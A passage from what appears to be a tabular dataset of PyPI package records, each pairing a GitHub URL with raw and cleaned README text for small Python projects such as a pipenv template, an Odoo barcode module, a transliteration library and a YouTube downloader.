Sourcing setup_aliases.ps1 for windows powershell or setup_aliases.sh in bash on Mac or Linux will provide with handy aliases for the shell of all those commands prepended with an underscore.

The bootstrap script creates a .venv directory inside the project directory hosting the virtual environment. It uses pipenv for that.
It is called by all other scripts before they do anything. So one could simple start by calling _lint and that would set up everything before it tried to actually lint the project

Once the code is ready to be delivered the _tag script should be called accepting one of three arguments, patch, minor, major following the semantic versioning scheme.
So for the initial delivery one would call

    $ _tag --minor

which would bump the version of the project to 0.1.0 tag it in git and do a push and also ask for the change and automagically update HISTORY.rst with the version and the change provided.


So the full workflow after git is initialized is:

 * repeat as necessary (of course it could be test - code - lint :) )

   * code
   * lint
   * test
 * commit and push
 * develop more through the code-lint-test cycle
 * tag (with the appropriate argument)
 * build
 * upload (if you want to host your package in pypi)
 * document (of course this could be run at any point)


Important Information
=====================

This template is based on pipenv. In order to be compatible with requirements.txt so the actual created package can be used by any part of the existing python ecosystem some hacks were needed.
So when building a package out of this **do not** simple call

    $ python setup.py sdist bdist_egg

**as this will produce an unusable artifact with files missing.**
Instead use the provided build and upload scripts that create all the necessary files in the artifact.



Project Features
================

* TODO




History
-------

0.0.1 (26-04-2023)
---------------------

* First code creation


0.1.0 (26-04-2023)
------------------

* my first ever pypi package :) 
",narvyk/wikiseriesbrentlib
gpt-scrapper,https://github.com/danpeczek/gpt-scrapper,2,644,583,"GPT Code Scrapper
=================

The simple code that scraps the code for the further analysis by the ChatGPT.

- Github: https://github.com/danpeczek/gpt-scrapper

Installation
============

.. code-block:: bash

    $ pip install gpt-scrapper

Usage
=====

.. code-block:: bash

    Usage: gpt-scrapper [OPTIONS] PATH
    Options:
      -e, --extensions TEXT  Extensions to search for
      --help                 Show this message and exit.

The result scrapped code should be available in the `output.txt` file.

License
=======
`MIT LICENSE <https://github.com/danpeczek/gpt-scrapper/blob/main/LICENSE>`__
","GPT Code Scrapper
=================

The simple code that scraps the code for the further analysis by the ChatGPT.

- Github: https://github.com/danpeczek/gpt-scrapper

Installation
============

.. code-block:: bash

    $ pip install gpt-scrapper

Usage
=====

.. code-block:: bash

    Usage: gpt-scrapper [OPTIONS] PATH
    Options:
      -e, --extensions TEXT  Extensions to search for
      --help                 Show this message and exit.

The result scrapped code should be available in the `output.txt` file.

License
=======
`MIT LICENSE `__
",danpeczek/gpt-scrapper
odoo13-addon-stock-barcodes-picking-batch,https://github.com/OCA/stock-logistics-barcode,3,3016,2627,"============================
Stock Barcodes Picking Batch
============================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fstock--logistics--barcode-lightgray.png?logo=github
    :target: https://github.com/OCA/stock-logistics-barcode/tree/13.0/stock_barcodes_picking_batch
    :alt: OCA/stock-logistics-barcode
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/stock-logistics-barcode-13-0/stock-logistics-barcode-13-0-stock_barcodes_picking_batch
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/150/13.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module extends barcode reader interface to allow to read quant barcodes.
After barcode has been readed the product, lot and location are been filled.

**Table of contents**

.. contents::
   :local:

Usage
=====

Read usage section from stock_barcodes module.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/stock-logistics-barcode/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/stock-logistics-barcode/issues/new?body=module:%20stock_barcodes_picking_batch%0Aversion:%2013.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Tecnativa

Contributors
~~~~~~~~~~~~


* `Tecnativa <https://www.tecnativa.com>`_:

  * Sergio Teruel
  * Carlos Dauden

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/stock-logistics-barcode <https://github.com/OCA/stock-logistics-barcode/tree/13.0/stock_barcodes_picking_batch>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","============================
Stock Barcodes Picking Batch
============================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fstock--logistics--barcode-lightgray.png?logo=github
    :target: https://github.com/OCA/stock-logistics-barcode/tree/13.0/stock_barcodes_picking_batch
    :alt: OCA/stock-logistics-barcode
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/stock-logistics-barcode-13-0/stock-logistics-barcode-13-0-stock_barcodes_picking_batch
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/150/13.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module extends barcode reader interface to allow to read quant barcodes.
After barcode has been readed the product, lot and location are been filled.

**Table of contents**

.. contents::
   :local:

Usage
=====

Read usage section from stock_barcodes module.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Tecnativa

Contributors
~~~~~~~~~~~~


* `Tecnativa `_:

  * Sergio Teruel
  * Carlos Dauden

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/stock-logistics-barcode `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/stock-logistics-barcode
foccoerpy,https://github.com/GaNiziolek/FoccoERPy,3,77,77,"# FoccoERPy
Biblioteca de funções que permitem se conectar à API do FoccoERP
","# FoccoERPy
Biblioteca de funções que permitem se conectar à API do FoccoERP
",ganiziolek/foccoerpy
datatable-faker,https://github.com/Agent-Hellboy/datatable-faker,1,1751,1751,"datatable-faker
================

Library to generate fake datatable for unittest

.. image:: https://img.shields.io/pypi/v/datatable-faker
   :target: https://pypi.python.org/pypi/datatable-faker/

.. image:: https://github.com/Agent-Hellboy/datatable-faker/actions/workflows/python-publish.yml/badge.svg
    :target: https://github.com/Agent-Hellboy/datatable-faker/

.. image:: https://img.shields.io/pypi/pyversions/datatable-faker.svg
   :target: https://pypi.python.org/pypi/datatable-faker/

.. image:: https://img.shields.io/pypi/l/datatable-faker.svg
   :target: https://pypi.python.org/pypi/datatable-faker/

.. image:: https://pepy.tech/badge/datatable-faker
   :target: https://pepy.tech/project/datatable-faker

.. image:: https://img.shields.io/pypi/format/datatable-faker.svg
   :target: https://pypi.python.org/pypi/datatable-faker/


Installation
============

::

   for stable version
      - pip install datatable-faker

   for developement
      - git clone https://github.com/Agent-Hellboy/datatable-faker
      - cd datatable-faker
      - python -m venv .venv
      - source .venv/bin/activate
      

Example
=======

.. code:: py

    from dataclasses import dataclass

    @dataclass()
    class Heartbeat:
        serialNumber: str
        cbsdId: str
        grantId: str
        grantState: str
        carrier: int
        maxEirp: int

    from datatable_faker import generate_fake_data

    fake_data = generate_fake_data(Heartbeat)
    print(fake_data)
    
    Heartbeat(serialNumber='economic', cbsdId='pull', grantId='save', grantState='same', carrier=729, maxEirp=1792)

Contributing
============

Pull requests are welcome. For major changes, please open an issue first
to discuss what you would like to change.
","datatable-faker
================

Library to generate fake datatable for unittest

.. image:: https://img.shields.io/pypi/v/datatable-faker
   :target: https://pypi.python.org/pypi/datatable-faker/

.. image:: https://github.com/Agent-Hellboy/datatable-faker/actions/workflows/python-publish.yml/badge.svg
    :target: https://github.com/Agent-Hellboy/datatable-faker/

.. image:: https://img.shields.io/pypi/pyversions/datatable-faker.svg
   :target: https://pypi.python.org/pypi/datatable-faker/

.. image:: https://img.shields.io/pypi/l/datatable-faker.svg
   :target: https://pypi.python.org/pypi/datatable-faker/

.. image:: https://pepy.tech/badge/datatable-faker
   :target: https://pepy.tech/project/datatable-faker

.. image:: https://img.shields.io/pypi/format/datatable-faker.svg
   :target: https://pypi.python.org/pypi/datatable-faker/


Installation
============

::

   for stable version
      - pip install datatable-faker

   for developement
      - git clone https://github.com/Agent-Hellboy/datatable-faker
      - cd datatable-faker
      - python -m venv .venv
      - source .venv/bin/activate
      

Example
=======

.. code:: py

    from dataclasses import dataclass

    @dataclass()
    class Heartbeat:
        serialNumber: str
        cbsdId: str
        grantId: str
        grantState: str
        carrier: int
        maxEirp: int

    from datatable_faker import generate_fake_data

    fake_data = generate_fake_data(Heartbeat)
    print(fake_data)
    
    Heartbeat(serialNumber='economic', cbsdId='pull', grantId='save', grantState='same', carrier=729, maxEirp=1792)

Contributing
============

Pull requests are welcome. For major changes, please open an issue first
to discuss what you would like to change.
",agent-hellboy/datatable-faker
ansutr-transliteration,https://github.com/ansunlp/transliterator,15,5068,5068,"# AI4Bharat Indic-Transliteration

An AI-based transliteration engine for 21 major languages of the Indian subcontinent.

This package provides support for:  
1. Python Library for transliteration from Roman to Native script
2. HTTP API server that can be hosted for interaction with web applications

## About

This library is based on our [research work](https://ai4bharat.org/transliteration) called **Indic-Xlit** to build tools that can translit text between Indic languages and colloquially-typed content (in English alphabet). We support both Roman-to-Native back-transliteration (English script to Indic language conversion), as well as Native-to-Roman transliteration (Indic to English alphabet conversion).

An online demo is available here: https://xlit.ai4bharat.org

## Languages Supported

|ISO 639 code | Language |
|---|--------------------|
|as |Assamese - অসমীয়া   |
|bn |Bangla - বাংলা       |
|brx|Boro - बड़ो	      |
|gu |Gujarati - ગુજરાતી   |
|hi |Hindi - हिंदी         |
|kn |Kannada - ಕನ್ನಡ     |
|ks |Kashmiri - كٲشُر 	  |
|gom|Konkani Goan - कोंकणी|
|mai|Maithili - मैथिली     |
|ml |Malayalam - മലയാളം|
|mni|Manipuri - ꯃꯤꯇꯩꯂꯣꯟ	 |
|mr |Marathi - मराठी       |
|ne |Nepali - नेपाली 	    |
|or |Oriya - ଓଡ଼ିଆ         |
|pa |Panjabi - ਪੰਜਾਬੀ      |
|sa |Sanskrit - संस्कृतम् 	 |
|sd |Sindhi - سنڌي       |
|si |Sinhala - සිංහල     |
|ta |Tamil - தமிழ்       |
|te |Telugu - తెలుగు      |
|ur |Urdu - اُردُو         |

## Usage

### Python Library

Import the wrapper for transliteration engine by:
```py
from ai4bharat.transliteration import XlitEngine
```

**Example 1** : Using word Transliteration

```py
e = XlitEngine(""hi"", beam_width=10, rescore=True)
out = e.translit_word(""namasthe"", topk=5)
print(out)
# output: {'hi': ['नमस्ते', 'नमस्थे', 'नामस्थे', 'नमास्थे', 'नमस्थें']}
```

Arguments:
- `beam_width` increases search size, resulting in improved accuracy but increases time/compute. (Default: `4`)
- `topk` returns only specified number of top results. (Default: `4`)
- `rescore` returns the reranked suggestions after using a dictionary. (Default: `True`)

Romanization: 
- By default, `XlitEngine` will load English-to-Indic model (default: `src_script_type=""roman""`)
- To load Indic-to-English model, use `src_script_type=""indic""`

For example: (also applicable for all other examples below)

```py
e = XlitEngine(src_script_type=""indic"", beam_width=10, rescore=False)
out = e.translit_word(""नमस्ते"", lang_code=""hi"", topk=5)
print(out)
# output: ['namaste', 'namastey', 'namasthe', 'namastay', 'namste']
```

**Example 2** : word Transliteration without rescoring
```py
e = XlitEngine(""hi"", beam_width=10, rescore=False)
out = e.translit_word(""namasthe"", topk=5)
print(out)
# output: {'hi': ['नमस्थे', 'नामस्थे', 'नमास्थे', 'नमस्थें', 'नमस्ते']}
```

**Example 3** : Using Sentence Transliteration

```py
e = XlitEngine(""ta"", beam_width=10)
out = e.translit_sentence(""vanakkam ulagam"")
print(out)
# output: {'ta': 'வணக்கம் உலகம்'}
```

Note:
- Only single top most prediction is returned for each word in sentence.

**Example 4** : Using Multiple language Transliteration

```py
e = XlitEngine([""ta"", ""ml""], beam_width=6)
# leave empty or use ""all"" to load all available languages
# e = XlitEngine(""all)

out = e.translit_word(""amma"", topk=3)
print(out)
# output: {'ml': ['അമ്മ', 'എമ്മ', 'അമ'], 'ta': ['அம்மா', 'அம்ம', 'அம்மை']}

out = e.translit_sentence(""vandhe maatharam"")
print(out)
# output: {'ml': 'വന്ധേ മാതരം', 'ta': 'வந்தே மாதரம்'}

## Specify language name to get only specific language result
out = e.translit_word(""amma"", lang_code = ""ml"", topk=5)
print(out)
# output: ['അമ്മ', 'എമ്മ', 'അമ', 'എഎമ്മ', 'അഎമ്മ']
```

**Example 5** : Transliteration for all available languages
```py
e = XlitEngine(beam_width=10)
out = e.translit_sentence(""namaskaar bharat"")
print(out)
# sample output: {'bn': 'নমস্কার ভারত', 'gu': 'નમસ્કાર ભારત', 'hi': 'नमस्कार भारत', 'kn': 'ನಮಸ್ಕಾರ್ ಭಾರತ್', 'ml': 'നമസ്കാർ ഭാരത്', 'pa': 'ਨਮਸਕਾਰ ਭਾਰਤ', 'si': 'නමස්කාර් භාරත්', 'ta': 'நமஸ்கார் பாரத்', 'te': 'నమస్కార్ భారత్', 'ur': 'نمسکار بھارت'}
```

---

### Web API Server

Running a flask server using a 3-line script:
```py
from ai4bharat.transliteration import xlit_server
app, engine = xlit_server.get_app()
app.run(host='0.0.0.0', port=8000)
```

Then on browser (or) curl, use link as `http://{IP-address}:{port}/tl/{lang-id}/{word_in_eng_script}`

Example:
http://localhost:8000/tl/ta/amma
http://localhost:8000/languages

---

## Debugging errors

If you face any of the following errors:
> ValueError: numpy.ndarray size changed, may indicate binary incompatibility. Expected 88 from C header, got 80 from PyObject
> ValueError: Please build (or rebuild) Cython components with `python setup.py build_ext --inplace`.

Run: `pip install --upgrade numpy`

---

## Release Notes

This package contains applications built around the Transliteration engine. The contents of this package can also be downloaded from [our GitHub repo](https://github.com/AI4Bharat/IndicXlit).

All the NN models of Indic-Xlit are released under MIT License.


","# AI4Bharat Indic-Transliteration

An AI-based transliteration engine for 21 major languages of the Indian subcontinent.

This package provides support for:  
1. Python Library for transliteration from Roman to Native script
2. HTTP API server that can be hosted for interaction with web applications

## About

This library is based on our [research work](https://ai4bharat.org/transliteration) called **Indic-Xlit** to build tools that can translit text between Indic languages and colloquially-typed content (in English alphabet). We support both Roman-to-Native back-transliteration (English script to Indic language conversion), as well as Native-to-Roman transliteration (Indic to English alphabet conversion).

An online demo is available here: https://xlit.ai4bharat.org

## Languages Supported

|ISO 639 code | Language |
|---|--------------------|
|as |Assamese - অসমীয়া   |
|bn |Bangla - বাংলা       |
|brx|Boro - बड़ो	      |
|gu |Gujarati - ગુજરાતી   |
|hi |Hindi - हिंदी         |
|kn |Kannada - ಕನ್ನಡ     |
|ks |Kashmiri - كٲشُر 	  |
|gom|Konkani Goan - कोंकणी|
|mai|Maithili - मैथिली     |
|ml |Malayalam - മലയാളം|
|mni|Manipuri - ꯃꯤꯇꯩꯂꯣꯟ	 |
|mr |Marathi - मराठी       |
|ne |Nepali - नेपाली 	    |
|or |Oriya - ଓଡ଼ିଆ         |
|pa |Panjabi - ਪੰਜਾਬੀ      |
|sa |Sanskrit - संस्कृतम् 	 |
|sd |Sindhi - سنڌي       |
|si |Sinhala - සිංහල     |
|ta |Tamil - தமிழ்       |
|te |Telugu - తెలుగు      |
|ur |Urdu - اُردُو         |

## Usage

### Python Library

Import the wrapper for transliteration engine by:
```py
from ai4bharat.transliteration import XlitEngine
```

**Example 1** : Using word Transliteration

```py
e = XlitEngine(""hi"", beam_width=10, rescore=True)
out = e.translit_word(""namasthe"", topk=5)
print(out)
# output: {'hi': ['नमस्ते', 'नमस्थे', 'नामस्थे', 'नमास्थे', 'नमस्थें']}
```

Arguments:
- `beam_width` increases search size, resulting in improved accuracy but increases time/compute. (Default: `4`)
- `topk` returns only specified number of top results. (Default: `4`)
- `rescore` returns the reranked suggestions after using a dictionary. (Default: `True`)

Romanization: 
- By default, `XlitEngine` will load English-to-Indic model (default: `src_script_type=""roman""`)
- To load Indic-to-English model, use `src_script_type=""indic""`

For example: (also applicable for all other examples below)

```py
e = XlitEngine(src_script_type=""indic"", beam_width=10, rescore=False)
out = e.translit_word(""नमस्ते"", lang_code=""hi"", topk=5)
print(out)
# output: ['namaste', 'namastey', 'namasthe', 'namastay', 'namste']
```

**Example 2** : word Transliteration without rescoring
```py
e = XlitEngine(""hi"", beam_width=10, rescore=False)
out = e.translit_word(""namasthe"", topk=5)
print(out)
# output: {'hi': ['नमस्थे', 'नामस्थे', 'नमास्थे', 'नमस्थें', 'नमस्ते']}
```

**Example 3** : Using Sentence Transliteration

```py
e = XlitEngine(""ta"", beam_width=10)
out = e.translit_sentence(""vanakkam ulagam"")
print(out)
# output: {'ta': 'வணக்கம் உலகம்'}
```

Note:
- Only single top most prediction is returned for each word in sentence.

**Example 4** : Using Multiple language Transliteration

```py
e = XlitEngine([""ta"", ""ml""], beam_width=6)
# leave empty or use ""all"" to load all available languages
# e = XlitEngine(""all)

out = e.translit_word(""amma"", topk=3)
print(out)
# output: {'ml': ['അമ്മ', 'എമ്മ', 'അമ'], 'ta': ['அம்மா', 'அம்ம', 'அம்மை']}

out = e.translit_sentence(""vandhe maatharam"")
print(out)
# output: {'ml': 'വന്ധേ മാതരം', 'ta': 'வந்தே மாதரம்'}

## Specify language name to get only specific language result
out = e.translit_word(""amma"", lang_code = ""ml"", topk=5)
print(out)
# output: ['അമ്മ', 'എമ്മ', 'അമ', 'എഎമ്മ', 'അഎമ്മ']
```

**Example 5** : Transliteration for all available languages
```py
e = XlitEngine(beam_width=10)
out = e.translit_sentence(""namaskaar bharat"")
print(out)
# sample output: {'bn': 'নমস্কার ভারত', 'gu': 'નમસ્કાર ભારત', 'hi': 'नमस्कार भारत', 'kn': 'ನಮಸ್ಕಾರ್ ಭಾರತ್', 'ml': 'നമസ്കാർ ഭാരത്', 'pa': 'ਨਮਸਕਾਰ ਭਾਰਤ', 'si': 'නමස්කාර් භාරත්', 'ta': 'நமஸ்கார் பாரத்', 'te': 'నమస్కార్ భారత్', 'ur': 'نمسکار بھارت'}
```

---

### Web API Server

Running a flask server using a 3-line script:
```py
from ai4bharat.transliteration import xlit_server
app, engine = xlit_server.get_app()
app.run(host='0.0.0.0', port=8000)
```

Then on browser (or) curl, use link as `http://{IP-address}:{port}/tl/{lang-id}/{word_in_eng_script}`

Example:
http://localhost:8000/tl/ta/amma
http://localhost:8000/languages

---

## Debugging errors

If you face any of the following errors:
> ValueError: numpy.ndarray size changed, may indicate binary incompatibility. Expected 88 from C header, got 80 from PyObject
> ValueError: Please build (or rebuild) Cython components with `python setup.py build_ext --inplace`.

Run: `pip install --upgrade numpy`

---

## Release Notes

This package contains applications built around the Transliteration engine. The contents of this package can also be downloaded from [our GitHub repo](https://github.com/AI4Bharat/IndicXlit).

All the NN models of Indic-Xlit are released under MIT License.


",ansunlp/transliterator
yt5,https://github.com/Simatwa/yt5,3,5729,4690,"<p align=""center"">
<a href=""https://github.com/Simatwa/yt5""><img src=""https://img.shields.io/static/v1?logo=github&color=blueviolet&label=Test&message=Pass""/></a>
<a href=""LICENSE""><img src=""https://img.shields.io/static/v1?logo=MIT&color=Blue&message=MIT&label=License""/></a>
<a href=""#"" alt=""coverage""><img src=""https://img.shields.io/static/v1?logo=Coverage&label=Coverage&message=80%&color=yellowgreen""/></a>
<a href=""https://github.com/psf/black""><img src=""https://img.shields.io/static/v1?label=Code style&message=black&color=Black""/></a>
<a href=""#""><img alt=""progress"" src=""https://img.shields.io/static/v1?logo=Progress&label=Progress&message=60%&color=green""/></a>
<a href=""https://wakatime.com/badge/user/321c8a21-57bc-4782-bb00-8733ff579c0d/project/9681babc-aedd-4a02-ae7c-f91f914ad9b3""><img src=""https://wakatime.com/badge/user/321c8a21-57bc-4782-bb00-8733ff579c0d/project/9681babc-aedd-4a02-ae7c-f91f914ad9b3.svg"" alt=""wakatime""/></a>
</p>

```
                                                                   
                                                                   
                                  tttt          555555555555555555 
                               ttt:::t          5::::::::::::::::5 
                               t:::::t          5::::::::::::::::5 
                               t:::::t          5:::::555555555555 
yyyyyyy           yyyyyyyttttttt:::::ttttttt    5:::::5            
 y:::::y         y:::::y t:::::::::::::::::t    5:::::5            
  y:::::y       y:::::y  t:::::::::::::::::t    5:::::5555555555   
   y:::::y     y:::::y   tttttt:::::::tttttt    5:::::::::::::::5  
    y:::::y   y:::::y          t:::::t          555555555555:::::5 
     y:::::y y:::::y           t:::::t                      5:::::5
      y:::::y:::::y            t:::::t                      5:::::5
       y:::::::::y             t:::::t    tttttt5555555     5:::::5
        y:::::::y              t::::::tttt:::::t5::::::55555::::::5
         y:::::y               tt::::::::::::::t 55:::::::::::::55 
        y:::::y                  tt:::::::::::tt   55:::::::::55   
       y:::::y                     ttttttttttt       555555555     
      y:::::y                                                      
     y:::::y                                                       
    y:::::y                                                        
   y:::::y                                                         
  yyyyyyy                                                          
                                                                   
                                                                   
```
- **yt5** is a [Python](https://python.org) script that downloads [YouTube](https://www.youtube.com) ***Videos*** & ***audios*** at `console` environment.

## Installation ##
- From Github - *source*

```
git clone https://github.com/Simatwa/yt5.git
cd yt5
python setup.py install

```

- From Pypi

```
pip install yt5
```

## Usage ##

#### Video #### 

- Videos can be downloaded by parsing a `URI` <sup>prefixed</sup> or <sub>postfixed</sub> by its category:
- For instances:
1. Single video :

```
$ yt5 url <Video-URI>

```		
![yt52](https://github.com/Simatwa/yt5/raw/main/assets/yt52.jpg)
     
- Alternatively, this can be done by omitting `url` command since it's the default category.

```
$ yt5 <Video-URI>

```
![yt51](https://github.com/Simatwa/yt5/raw/main/assets/yt51.jpg)


2. All videos in a Playlist :

```
$ yt5 playlist <Playlist-URI>

```
![yt53](https://github.com/Simatwa/yt5/raw/main/assets/yt53.jpg)
	 
3. All videos in a Channel : 

```
$ yt5 channel <Channel-URI>

```
![yt54](https://github.com/Simatwa/yt5/raw/main/assets/yt54.jpg)
		
4. Collection of single-video's URI contained in a text file : 

```
$ yt5 fnm <file-path>

```
![yt55](https://github.com/Simatwa/yt5/raw/main/assets/yt55.jpg)
			
####  Audio #### 

- Audio of a video can be downloaded by adding `--mp3` to the commands parsed.
  - For instance:
1. Single audio : 
  		
```
$ yt5 url <Video-URI>  --mp3

```

![yt56](https://github.com/Simatwa/yt5/raw/main/assets/yt56.jpg)
       
- Similarly, this can be done to **other** ***categories***.

- For further information you can run:
	
```
$ yt5 -h

```  

* Output :

```
usage: yt5 [-h] [-v] [-res [720p|480p|360p|240p|144p]] [-max MAXIMUM] [-dir DIRECTORY] [--mp3]
           [--show] [--static] [--usage]
           [[fnm|url|playlist|channel]] url

positional arguments:
  [fnm|url|playlist|channel]
                        Category of the videos referred by the link or filename[fnm] containing
                        links
  url                   Link of the video

options:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -res [720p|480p|360p|240p|144p], --resolution [720p|480p|360p|240p|144p]
                        Resolution [quality] of videos to be downloaded in
  -max MAXIMUM, --maximum MAXIMUM
                        Maximum videos to be downloaded
  -dir DIRECTORY, --directory DIRECTORY
                        Directory for saving downloaded file
  --mp3                 Specify to download audio only
  --show                Show the downloaded file-path
  --static              Restricts stdout of file-path in prose-format
  --usage               Show this help info in more stylistic way

```


## Independencies ##

1. [pytube](https://github.com/pytube/pytube)
2. [colorama](https://github.com/pytube/pytube)
3. [tabulate](https://github.com/astanin/python-tabulate)
 
 * [Review](requirements.txt).


## Acknowledgements ##

- [x] [Pytube](https://github.com/pytube/pytube)
- [x] [Python Team](https://python.org)
","








```
                                                                   
                                                                   
                                  tttt          555555555555555555 
                               ttt:::t          5::::::::::::::::5 
                               t:::::t          5::::::::::::::::5 
                               t:::::t          5:::::555555555555 
yyyyyyy           yyyyyyyttttttt:::::ttttttt    5:::::5            
 y:::::y         y:::::y t:::::::::::::::::t    5:::::5            
  y:::::y       y:::::y  t:::::::::::::::::t    5:::::5555555555   
   y:::::y     y:::::y   tttttt:::::::tttttt    5:::::::::::::::5  
    y:::::y   y:::::y          t:::::t          555555555555:::::5 
     y:::::y y:::::y           t:::::t                      5:::::5
      y:::::y:::::y            t:::::t                      5:::::5
       y:::::::::y             t:::::t    tttttt5555555     5:::::5
        y:::::::y              t::::::tttt:::::t5::::::55555::::::5
         y:::::y               tt::::::::::::::t 55:::::::::::::55 
        y:::::y                  tt:::::::::::tt   55:::::::::55   
       y:::::y                     ttttttttttt       555555555     
      y:::::y                                                      
     y:::::y                                                       
    y:::::y                                                        
   y:::::y                                                         
  yyyyyyy                                                          
                                                                   
                                                                   
```
- **yt5** is a [Python](https://python.org) script that downloads [YouTube](https://www.youtube.com) ***Videos*** & ***audios*** at `console` environment.

## Installation ##
- From Github - *source*

```
git clone https://github.com/Simatwa/yt5.git
cd yt5
python setup.py install

```

- From Pypi

```
pip install yt5
```

## Usage ##

#### Video #### 

- Videos can be downloaded by parsing a `URI` prefixed or postfixed by its category:
- For instances:
1. Single video :

```
$ yt5 url 

```		
![yt52](https://github.com/Simatwa/yt5/raw/main/assets/yt52.jpg)
     
- Alternatively, this can be done by omitting `url` command since it's the default category.

```
$ yt5 

```
![yt51](https://github.com/Simatwa/yt5/raw/main/assets/yt51.jpg)


2. All videos in a Playlist :

```
$ yt5 playlist 

```
![yt53](https://github.com/Simatwa/yt5/raw/main/assets/yt53.jpg)
	 
3. All videos in a Channel : 

```
$ yt5 channel 

```
![yt54](https://github.com/Simatwa/yt5/raw/main/assets/yt54.jpg)
		
4. Collection of single-video's URI contained in a text file : 

```
$ yt5 fnm 

```
![yt55](https://github.com/Simatwa/yt5/raw/main/assets/yt55.jpg)
			
####  Audio #### 

- Audio of a video can be downloaded by adding `--mp3` to the commands parsed.
  - For instance:
1. Single audio : 
  		
```
$ yt5 url   --mp3

```

![yt56](https://github.com/Simatwa/yt5/raw/main/assets/yt56.jpg)
       
- Similarly, this can be done to **other** ***categories***.

- For further information you can run:
	
```
$ yt5 -h

```  

* Output :

```
usage: yt5 [-h] [-v] [-res [720p|480p|360p|240p|144p]] [-max MAXIMUM] [-dir DIRECTORY] [--mp3]
           [--show] [--static] [--usage]
           [[fnm|url|playlist|channel]] url

positional arguments:
  [fnm|url|playlist|channel]
                        Category of the videos referred by the link or filename[fnm] containing
                        links
  url                   Link of the video

options:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -res [720p|480p|360p|240p|144p], --resolution [720p|480p|360p|240p|144p]
                        Resolution [quality] of videos to be downloaded in
  -max MAXIMUM, --maximum MAXIMUM
                        Maximum videos to be downloaded
  -dir DIRECTORY, --directory DIRECTORY
                        Directory for saving downloaded file
  --mp3                 Specify to download audio only
  --show                Show the downloaded file-path
  --static              Restricts stdout of file-path in prose-format
  --usage               Show this help info in more stylistic way

```


## Independencies ##

1. [pytube](https://github.com/pytube/pytube)
2. [colorama](https://github.com/pytube/pytube)
3. [tabulate](https://github.com/astanin/python-tabulate)
 
 * [Review](requirements.txt).


## Acknowledgements ##

- [x] [Pytube](https://github.com/pytube/pytube)
- [x] [Python Team](https://python.org)
",simatwa/yt5
audioprocessor,https://github.com/TheWordSmith123/Audio-Processor,6,2599,2599,"AudioProcessor
==============

`AudioProcessor` is a Python class that provides functionality for recording audio, transcribing audio to text, and converting text to audio.

Class Methods
-------------

### `__init__(self, frame_duration_ms=30, sample_rate=16000, chunk_size=1024, vad_mode=2)`

Initialize the `AudioProcessor` class.

**Parameters:**

*   `frame_duration_ms`: Frame duration in milliseconds (default: 30 ms)
*   `sample_rate`: Audio sample rate (default: 16000 Hz)
*   `chunk_size`: Audio chunk size for processing (default: 1024)
*   `vad_mode`: Voice Activity Detection (VAD) mode (default: 2)

### `record_audio(self, output_file_path)`

Record audio from the microphone and save it to a .wav file.

**Parameters:**

*   `output_file_path`: Output file path for the recorded audio

### `audio_to_text(self, audio_file_path, **kwargs)`

Transcribe an audio file.

**Parameters:**

*   `audio_file_path`: Input audio file path
*   `**kwargs`: Keyword arguments for preprocessing and other options

**Returns:**

*   Transcribed text as a string

### `text_to_audio(self, text, audio_file_path, lang='en', volume=1.0, sample_rate=44100, bit_depth=16)`

Convert text to an audio file and play it.

